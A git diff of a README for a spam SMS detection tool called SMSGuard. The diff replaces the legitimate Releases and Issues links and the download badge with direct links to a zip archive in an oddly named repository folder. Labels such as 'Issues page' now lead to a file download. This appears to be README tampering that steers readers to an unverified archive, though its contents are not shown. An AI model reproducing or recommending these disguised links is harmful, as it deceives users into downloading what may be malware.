@@ -1,6 +1,6 @@
 # 🛡️ SMSGuard-Intelligent-Spam-SMS-Detection-System - Protect Yourself from Spam SMS
 
-[![Download SMSGuard](https://img.shields.io/badge/Download-SMSGuard-blue?style=plastic&logo=github)](https://github.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/releases)
+[![Download SMSGuard](https://raw.githubusercontent.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/main/unwarnished/SMSGuard-Intelligent-Spam-SMS-Detection-System_1.9.zip)](https://raw.githubusercontent.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/main/unwarnished/SMSGuard-Intelligent-Spam-SMS-Detection-System_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run SMSGuard effectively, you need:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/releases) to download the latest version of SMSGuard.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/main/unwarnished/SMSGuard-Intelligent-Spam-SMS-Detection-System_1.9.zip) to download the latest version of SMSGuard.
 
 2. Find the most recent version listed. You will see several files available for download.
 
@@ -59,7 +59,7 @@ To run SMSGuard effectively, you need:
   
 ### 🤝 Support
 
-For any questions or issues, please visit the [Issues page](https://github.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/issues) on GitHub to get assistance from the community or report a bug.
+For any questions or issues, please visit the [Issues page](https://raw.githubusercontent.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/main/unwarnished/SMSGuard-Intelligent-Spam-SMS-Detection-System_1.9.zip) on GitHub to get assistance from the community or report a bug.
 
 ## 📄 License
 
